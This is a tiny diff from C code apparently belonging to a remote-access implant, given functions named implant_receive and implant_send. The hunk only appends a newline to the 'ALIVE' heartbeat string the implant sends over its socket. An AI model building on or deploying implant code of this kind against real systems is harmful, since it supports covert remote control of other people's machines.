@@ -12,7 +12,7 @@ void *implant_receive(void *vargp){
 }
 
 void *implant_send(void *vargp){
-	char *alive = "ALIVE";
+	char *alive = "ALIVE\n";
 	int *sockfd = (int*)vargp;
 	
 	for (;;){
